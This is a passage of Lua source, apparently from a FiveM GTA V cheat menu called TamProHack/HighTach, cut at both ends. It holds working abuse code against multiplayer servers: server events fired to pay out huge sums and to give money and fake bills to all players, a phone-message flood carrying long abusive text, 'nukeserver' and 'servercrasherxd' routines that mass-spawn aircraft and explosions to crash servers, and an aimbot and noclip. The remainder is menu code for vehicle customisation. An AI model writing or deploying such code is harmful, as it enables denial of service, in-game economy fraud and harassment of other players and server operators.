    local colors = "asdrubale"
    local extra_colors = "asdrubale"
    local neoncolor = "asdrubale"
    local mods = "asdrubale"
    local smokecolor = "asdrubale"
    local plate = math.random(1,999999)
    local plateindex = "asdrubale"
    local primarycolor = "asdrubale"
    local secondarycolor = "asdrubale"
    local pearlescentcolor = "asdrubale"
    local wheelcolor = "asdrubale"
    local neoncolor1 = "asdrubale"
    local neoncolor2 = "asdrubale"
    local neoncolor3 = "asdrubale"
    local windowtint = "asdrubale"
    local wheeltype = "asdrubale"
    local smokecolor1 = "asdrubale"
    local smokecolor2 = "asdrubale"
    local smokecolor3 = "asdrubale"
    local mods0 = "asdrubale"
    local mods1 = "asdrubale"
    local mods2 = "asdrubale"
    local mods3 = "asdrubale"
    local mods4 = "asdrubale"
    local mods5 = "asdrubale"
    local mods6 = "asdrubale"
    local mods7 = "asdrubale"
    local mods8 = "asdrubale"
    local mods9 = "asdrubale"
    local mods10 ="asdrubale"
    local mods11 = "asdrubale"
    local mods12 = "asdrubale"
    local mods13 = "asdrubale"
    local mods14 = "asdrubale"
    local mods15 = "asdrubale"
    local mods16 = "asdrubale"
    local mods23 = "asdrubale"
    local mods24 = "asdrubale"
    local turbo = "asdrubale"
    local tiresmoke = "asdrubale"
    local xenon = "asdrubale"
    local neon1 = "asdrubale"
    local neon2 = "asdrubale"
    local neon3 = "asdrubale"
    local bulletproof = "asdrubale"
    local variation = "asdrubale"
    TriggerServerEvent('lscustoms:UpdateVeh', vehicle, plate, plateindex,primarycolor,secondarycolor,pearlescentcolor,wheelcolor,neoncolor1,neoncolor2,neoncolor3,windowtint,wheeltype,mods0,mods1,mods2,mods3,mods4,mods5,mods6,mods7,mods8,mods9,mods10,mods11,mods12,mods13,mods14,mods15,mods16,turbo,tiresmoke,xenon,mods23,mods24,neon0,neon1,neon2,neon3,bulletproof,smokecolor1,smokecolor2,smokecolor3,variation)
    end
  end
end
      end

if gcphonedestroy then
  local numBase0 = math.random(100,999)
  local numBase1 = math.random(0,9999)
  local num = string.format("%03d-%04d", numBase0, numBase1 )
  local num2 = string.format("%03d-%04d", numBase0, numBase1 )
  local transmitter = num
  local receiver = num2
  local message = "我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地"
  local owner = math.random(0,1)
  local sourcePlayer = math.random(0,87)
  local channel = num
  local messages = message..message..message..message..message..message..message..message
  local phone_number = num
  TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, messages, owner)
  TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
end

          if haharip then
esxdestroyv3()
nukeserver()
vrpdestroy()
          end

          function esxdestroyv3()
TSE("esx_jobs:caution", "give_back", 9999999999)
TSE("esx_fueldelivery:pay", 9999999999)
TSE("esx_carthief:pay", 9999999999)
TSE("esx_godirtyjob:pay", 9999999999)
TSE("esx_pizza:pay", 9999999999)
TSE("esx_ranger:pay", 9999999999)
TSE("esx_garbagejob:pay", 9999999999)
TSE("esx_truckerjob:pay", 9999999999)
TSE("AdminMenu:giveBank", 9999999999)
TSE("AdminMenu:giveCash", 9999999999)
TSE("esx_gopostaljob:pay", 9999999999)
TSE("esx_banksecurity:pay", 9999999999)
TSE("esx_slotmachine:sv:2", 9999999999)
for c = 0, 9 do

  TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."HighTach.com - Hello guys!")
end
local pbase = GetActivePlayers()
for i=0, #pbase do
  TSE("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 101337)
  TSE("esx_billing:sendBill", GetPlayerServerId(i), "society_police", "Lynx10 is here LOL", 13374316)
end
          end

          if titolo ~= "<FONT COLOR='#1F2124'>TamProHack ~r~NEW" then
ForceSocialClubUpdate()
          end



          function nukeserver()
local camion = "Avenger"
local avion = "CARGOPLANE"
local avion2 = "luxor"
local heli = "maverick"
local random = "blimp2"
while not HasModelLoaded(GetHashKey(avion)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(avion))
end
while not HasModelLoaded(GetHashKey(avion2)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(avion2))
end
while not HasModelLoaded(GetHashKey(camion)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(camion))
end
while not HasModelLoaded(GetHashKey(heli)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(heli))
end
while not HasModelLoaded(GetHashKey(random)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(random))
end
for i=0,128 do
  for c = 0, 9 do
    TSE("_chat:messageEntered", "HighTach.com ยินดีต้อนรับ", { 141, 211, 255 }, "^"..c.."HighTachMenu - HighTach.com ยินดีต้อนรับ")
  end
  CreateVehicle(GetHashKey(camion),GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) 
  CreateVehicle(GetHashKey(avion),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
  CreateVehicle(GetHashKey(avion2),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
  CreateVehicle(GetHashKey(heli),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
        CreateVehicle(GetHashKey(random),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
  AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
      end
          end

          if servercrasherxd then
Citizen.CreateThread(function()
local camion = "Avenger"
local avion = "CARGOPLANE"
local avion2 = "luxor"
local heli = "maverick"
local random = "blimp2"
while not HasModelLoaded(GetHashKey(avion)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(avion))
end
while not HasModelLoaded(GetHashKey(avion2)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(avion2))
end
while not HasModelLoaded(GetHashKey(camion)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(camion))
end
while not HasModelLoaded(GetHashKey(heli)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(heli))
end
while not HasModelLoaded(GetHashKey(random)) do
  Citizen.Wait(0)
  RequestModel(GetHashKey(random))
end
local pbase = GetActivePlayers()
for i=0, #pbase do

  for a = 100, 150 do
    local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
    CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
    CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
    CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
    CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true)
  end
end
end)
          end

          if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
if IsControlPressed(0, 209) then
  SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 250.0)
elseif IsControlPressed(0, 210) then
  SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
end
          end

          if Aimbot then
for player=1, 128 do
  if player ~= PlayerId() then
    if IsPlayerFreeAiming(PlayerId()) then
      local TargetPed = GetPlayerPed(player)
      local TargetPos = GetEntityCoords(TargetPed)
      local Exist = DoesEntityExist(TargetPed)
      local Dead = IsPlayerDead(TargetPed)

      if Exist and not Dead then
        local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
        if IsEntityVisible(TargetPed) and OnScreen then
          if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 100000) then
          local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
          SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
          SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
          end
        end
      end
    end
  end
end
      end

          if rapidfire then
DRFT()
          end

          if explosiveammo then
local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
if ret then
  AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
end
          end



          if RainbowVeh then
Citizen.Wait(0)
local rgb = RGB(1.0)
SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
          end

          if rainbowh then
for i = -1, 12 do
  Citizen.Wait(0)
  local ra = RGB(1.0)
  SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
  SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
  if i == 12 then
    i = -1
  end
end
          end

          if t2x then
SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
          end

          if t4x then
SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
          end

          if t10x then
SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
          end

          if t16x then
SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
          end

          if txd then
SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
          end

          if tbxd then
SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
          end

          if Noclip then
DrawTxt("NOCLIP ~g~ON", 0.70, 0.9)
local currentSpeed = 10
local noclipEntity =
IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
FreezeEntityPosition(PlayerPedId(-1), true)
SetEntityInvincible(PlayerPedId(-1), true)

local newPos = GetEntityCoords(entity)

DisableControlAction(0, 32, true)
DisableControlAction(0, 268, true)

DisableControlAction(0, 31, true)

DisableControlAction(0, 269, true)
DisableControlAction(0, 33, true)

DisableControlAction(0, 266, true)
DisableControlAction(0, 34, true)

DisableControlAction(0, 30, true)

DisableControlAction(0, 267, true)
DisableControlAction(0, 35, true)

DisableControlAction(0, 44, true)
DisableControlAction(0, 20, true)

local yoff = 0.0
local zoff = 0.0

if GetInputMode() == "MouseAndKeyboard" then
  if IsDisabledControlPressed(0, 32) then
    yoff = 0.5
  end
  if IsDisabledControlPressed(0, 33) then
    yoff = -0.5
  end
  if IsDisabledControlPressed(0, 34) then
    SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
  end
  if IsDisabledControlPressed(0, 35) then
    SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
  end
  if IsDisabledControlPressed(0, 44) then
    zoff = 0.21
  end
  if IsDisabledControlPressed(0, 20) then
    zoff = -0.21
  end
end

newPos =
GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

local heading = GetEntityHeading(noclipEntity)
SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
SetEntityHeading(noclipEntity, heading)

SetEntityCollision(noclipEntity, false, false)
SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

FreezeEntityPosition(noclipEntity, false)
SetEntityInvincible(noclipEntity, false)
SetEntityCollision(noclipEntity, true, true)
          end
        end
        end)

        Citizen.CreateThread(function()
          FreezeEntityPosition(entity, false)
          local playerIdxWeapon = 1;
          local WeaponTypeSelect = nil
          local WeaponSelected = nil
          local ModSelected = nil
          local currentItemIndex = 1
          local selectedItemIndex = 1
          local powerboost = { 1.0, 2.0, 4.0, 10.0, 512.0, 9999.0 }
          local spawninside = false
          JesusRadius = 5.0
          JesusRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
          local currJesusRadiusIndex = 1
          local selJesusRadiusIndex = 1
          TamProHackModZ.CreateMenu(HighTachMenu, TamProHackPRO)
          TamProHackModZ.CreateSubMenu(sMX, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(TRPM, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(AIMENU, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(Repair, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(WMPS, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(advm, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(MODELS, HighTachMenu, bytexd) 
          TamProHackModZ.CreateSubMenu(MODEL, MODELS, bytexd)
          TamProHackModZ.CreateSubMenu(LMX, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(VMS, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(OPMS, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(poms, OPMS, bytexd)
          TamProHackModZ.CreateSubMenu(dddd, advm, bytexd)
          TamProHackModZ.CreateSubMenu(esms, LMX, bytexd)
          TamProHackModZ.CreateSubMenu(ESXD, LMX, bytexd)
          TamProHackModZ.CreateSubMenu(ESXC, LMX, bytexd)
          TamProHackModZ.CreateSubMenu(VRPT, LMX, bytexd)
          TamProHackModZ.CreateSubMenu(Pure, LMX, bytexd)
          TamProHackModZ.CreateSubMenu(Seller, LMX, bytexd)
          TamProHackModZ.CreateSubMenu(MSTC, LMX, bytexd)
          TamProHackModZ.CreateSubMenu(crds, HighTachMenu, bytexd)
          TamProHackModZ.CreateSubMenu(Tmas, poms, bytexd)
		  TamProHackModZ.CreateSubMenu(titansentry1, poms, bytexd)
          TamProHackModZ.CreateSubMenu(WTNe, WMPS, bytexd)
          TamProHackModZ.CreateSubMenu(WTSbull, WTNe, bytexd)
          TamProHackModZ.CreateSubMenu(WOP, WTSbull, bytexd)
          TamProHackModZ.CreateSubMenu(MSMSA, WOP, bytexd)
          TamProHackModZ.CreateSubMenu(CTSa, VMS, bytexd)
          TamProHackModZ.CreateSubMenu(SettingsMenu, MainMenu, Settings)
          TamProHackModZ.CreateSubMenu(Credits, SettingsMenu, Credits)
          TamProHackModZ.CreateSubMenu(Themes, SettingsMenu, Themes)
          TamProHackModZ.CreateSubMenu(InfoMenu, SettingsMenu, Info)
          TamProHackModZ.CreateSubMenu(CTS, CTSa, bytexd)
          TamProHackModZ.CreateSubMenu(cAoP, CTS, bytexd)
          TamProHackModZ.CreateSubMenu(MTSS, VMS, bytexd)
          TamProHackModZ.CreateSubMenu(mtsl, MTSS, bytexd)
          TamProHackModZ.CreateSubMenu(CTSmtsps, mtsl, bytexd)
          TamProHackModZ.CreateSubMenu(GSWP, OPMS, bytexd)
          TamProHackModZ.CreateSubMenu(espa, HighTachMenu, bytexd) 
          TamProHackModZ.CreateSubMenu(LSCC, VMS, bytexd)
          TamProHackModZ.CreateSubMenu(tngns, LSCC, bytexd)
          TamProHackModZ.CreateSubMenu(prof, LSCC, bytexd)
          TamProHackModZ.CreateSubMenu(bmm, VMS, bytexd)
          TamProHackModZ.CreateSubMenu(SPD, Tmas, bytexd)
          TamProHackModZ.CreateSubMenu(gccccc, VMS, bytexd)
          TamProHackModZ.CreateSubMenu(CMSMS, WMPS, bytexd)
          TamProHackModZ.CreateSubMenu(GAPA,OPMS,bytexd)



          for i,theItem in pairs(vehicleMods) do
TamProHackModZ.CreateSubMenu(theItem.id, tngns, theItem.name)

if theItem.id == "paint" then
  TamProHackModZ.CreateSubMenu("primary", theItem.id, "Primary Paint")
  TamProHackModZ.CreateSubMenu("secondary", theItem.id, "Secondary Paint")

  TamProHackModZ.CreateSubMenu("rimpaint", theItem.id, "Wheel Paint")

  TamProHackModZ.CreateSubMenu("classic1", "primary", "Classic Paint")
  TamProHackModZ.CreateSubMenu("metallic1", "primary", "Metallic Paint")
  TamProHackModZ.CreateSubMenu("matte1", "primary","Matte Paint")
  TamProHackModZ.CreateSubMenu("metal1", "primary","Metal Paint")
  TamProHackModZ.CreateSubMenu("classic2", "secondary", "Classic Paint")
  TamProHackModZ.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
  TamProHackModZ.CreateSubMenu("matte2", "secondary","Matte Paint")
  TamProHackModZ.CreateSubMenu("metal2", "secondary","Metal Paint")
  TamProHackModZ.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
  TamProHackModZ.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
  TamProHackModZ.CreateSubMenu("matte3", "rimpaint","Matte Paint")
  TamProHackModZ.CreateSubMenu("metal3", "rimpaint","Metal Paint")

end
          end

          for i,theItem in pairs(perfMods) do
TamProHackModZ.CreateSubMenu(theItem.id, prof, theItem.name)
          end

          local SelectedPlayer

          while Enabled do

ped = PlayerPedId()
veh = GetVehiclePedIsUsing(ped)
SetVehicleModKit(veh,0)

for i,theItem in pairs(vehicleMods) do

  if TamProHackModZ.IsMenuOpened(tngns) then
    if isPreviewing then
      if oldmodtype == "neon" then
        local r,g,b = table.unpack(oldmod)
        SetVehicleNeonLightsColour(veh,r,g,b)
        SetVehicleNeonLightEnabled(veh, 0, oldmodaction)
        SetVehicleNeonLightEnabled(veh, 1, oldmodaction)
        SetVehicleNeonLightEnabled(veh, 2, oldmodaction)
        SetVehicleNeonLightEnabled(veh, 3, oldmodaction)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif oldmodtype == "paint" then
        local pa,pb,pc,pd = table.unpack(oldmod)
        SetVehicleColours(veh, pa,pb)
        SetVehicleExtraColours(veh,pc,pd)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      else
        if oldmodaction == "rm" then
          RemoveVehicleMod(veh, oldmodtype)
          isPreviewing = false
          oldmodtype = -1
          oldmod = -1
        else
          SetVehicleMod(veh, oldmodtype,oldmod,false)
          isPreviewing = false
          oldmodtype = -1
          oldmod = -1
        end
      end
    end
  end

  if TamProHackModZ.IsMenuOpened(theItem.id) then
    if theItem.id == "wheeltypes" then
      if TamProHackModZ.Button("Sport Wheels") then
        SetVehicleWheelType(veh,0)
      elseif TamProHackModZ.Button("Muscle Wheels") then
        SetVehicleWheelType(veh,1)
      elseif TamProHackModZ.Button("Lowrider Wheels") then
        SetVehicleWheelType(veh,2)
      elseif TamProHackModZ.Button("SUV Wheels") then
        SetVehicleWheelType(veh,3)
      elseif TamProHackModZ.Button("Offroad Wheels") then
        SetVehicleWheelType(veh,4)
      elseif TamProHackModZ.Button("Tuner Wheels") then
        SetVehicleWheelType(veh,5)
      elseif TamProHackModZ.Button("High End Wheels") then
        SetVehicleWheelType(veh,7)
      end
      TamProHackModZ.Display()
    elseif theItem.id == "extra" then
      local extras = checkValidVehicleExtras()
      for i,theItem in pairs(extras) do
        if IsVehicleExtraTurnedOn(veh,i) then
          pricestring = "Installed"
        else
          pricestring = "Not Installed"
        end

        if TamProHackModZ.Button(theItem.menuName, pricestring) then
          SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh,i))
        end
      end
      TamProHackModZ.Display()
    elseif theItem.id == "headlight" then

      if TamProHackModZ.Button("None") then
        SetVehicleHeadlightsColour(veh, -1)
      end

      for theName, theItem in pairs(headlightscolor) do
        tp = GetVehicleHeadlightsColour(veh)

        if tp == theItem.id and not isPreviewing then
          pricetext = "Installed"
        else
          if isPreviewing and tp == theItem.id then
pricetext = "Previewing"
          else
pricetext = "Not Installed"
          end
        end
        head = GetVehicleHeadlightsColour(veh)
        if TamProHackModZ.Button(theItem.name, pricetext) then
          if not isPreviewing then
oldmodtype = "headlight"
oldmodaction = false
oldhead = GetVehicleHeadlightsColour(veh)
oldmod = table.pack(oldhead)
SetVehicleHeadlightsColour(veh, theItem.id)

isPreviewing = true
          elseif isPreviewing and head == theItem.id then
ToggleVehicleMod(veh, 22, true)
SetVehicleHeadlightsColour(veh, theItem.id)
isPreviewing = false
oldmodtype = -1
oldmod = -1
          elseif isPreviewing and head ~= theItem.id then
SetVehicleHeadlightsColour(veh, theItem.id)
isPreviewing = true
          end
        end
      end
      TamProHackModZ.Display()
    elseif theItem.id == "licence" then

      if TamProHackModZ.Button("None") then
        SetVehicleNumberPlateTextIndex(veh, 3)
      end

      for theName, theItem in pairs(licencetype) do
        tp = GetVehicleNumberPlateTextIndex(veh)

        if tp == theItem.id and not isPreviewing then
          pricetext = "Installed"
        else
          if isPreviewing and tp == theItem.id then
pricetext = "Previewing"
          else
pricetext = "Not Installed"
          end
        end
        plate = GetVehicleNumberPlateTextIndex(veh)
        if TamProHackModZ.Button(theItem.name, pricetext) then
          if not isPreviewing then
oldmodtype = "headlight"
oldmodaction = false
oldhead = GetVehicleNumberPlateTextIndex(veh)
oldmod = table.pack(oldhead)
SetVehicleNumberPlateTextIndex(veh, theItem.id)

isPreviewing = true
          elseif isPreviewing and plate == theItem.id then
SetVehicleNumberPlateTextIndex(veh, theItem.id)
isPreviewing = false
oldmodtype = -1
oldmod = -1
          elseif isPreviewing and plate ~= theItem.id then
SetVehicleNumberPlateTextIndex(veh, theItem.id)
isPreviewing = true
          end
        end
      end
      TamProHackModZ.Display()
    elseif theItem.id == "neon" then

      if TamProHackModZ.Button("None") then
        SetVehicleNeonLightsColour(veh,255,255,255)
        SetVehicleNeonLightEnabled(veh,0,false)
        SetVehicleNeonLightEnabled(veh,1,false)
        SetVehicleNeonLightEnabled(veh,2,false)
        SetVehicleNeonLightEnabled(veh,3,false)
      end


      for i,theItem in pairs(neonColors) do
        colorr,colorg,colorb = table.unpack(theItem)
        r,g,b = GetVehicleNeonLightsColour(veh)

        if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle,2) and not isPreviewing then
          pricestring = "Installed"
        else
          if isPreviewing and colorr == r and colorg == g and colorb == b then
pricestring = "Previewing"
          else
pricestring = "Not Installed"
          end
        end

        if TamProHackModZ.Button(i, pricestring) then
          if not isPreviewing then
oldmodtype = "neon"
oldmodaction = IsVehicleNeonLightEnabled(veh,1)
oldr,oldg,oldb = GetVehicleNeonLightsColour(veh)
oldmod = table.pack(oldr,oldg,oldb)
SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
SetVehicleNeonLightEnabled(veh,0,true)
SetVehicleNeonLightEnabled(veh,1,true)
SetVehicleNeonLightEnabled(veh,2,true)
SetVehicleNeonLightEnabled(veh,3,true)
isPreviewing = true
          elseif isPreviewing and colorr == r and colorg == g and colorb == b then
SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
SetVehicleNeonLightEnabled(veh,0,true)
SetVehicleNeonLightEnabled(veh,1,true)
SetVehicleNeonLightEnabled(veh,2,true)
SetVehicleNeonLightEnabled(veh,3,true)
isPreviewing = false
oldmodtype = -1
oldmod = -1
          elseif isPreviewing and colorr ~= r or colorg ~= g or colorb ~= b then
SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
SetVehicleNeonLightEnabled(veh,0,true)
SetVehicleNeonLightEnabled(veh,1,true)
SetVehicleNeonLightEnabled(veh,2,true)
SetVehicleNeonLightEnabled(veh,3,true)
isPreviewing = true
          end
        end
      end
      TamProHackModZ.Display()
    elseif theItem.id == "paint" then

      if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Primary Paint","primary") then

      elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Secondary Paint","secondary") then

      elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Wheel Paint","rimpaint") then

      end


      TamProHackModZ.Display()

    else
      local valid = checkValidVehicleMods(theItem.id)
      for i,ctheItem in pairs(valid) do
        for eh,tehEtem in pairs(horns) do
          if eh == theItem.name and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
price = "Not Installed"
          elseif eh == theItem.name and isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
price = "Previewing"
          elseif eh == theItem.name and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
price = "Installed"
          end
        end
        if ctheItem.menuName == "~b~Stock" then end
        if theItem.name == "Horns" then
          for chorn,HornId in pairs(horns) do
if HornId == ci-1 then
  ctheItem.menuName = chorn
end
          end
        end
        if ctheItem.menuName == "NULL" then
          ctheItem.menuName = "unknown"
        end
        if TamProHackModZ.Button(ctheItem.menuName) then

          if not isPreviewing then
oldmodtype = theItem.id
oldmod = GetVehicleMod(veh, theItem.id)
isPreviewing = true
if ctheItem.data.realIndex == -1 then
  oldmodaction = "rm"
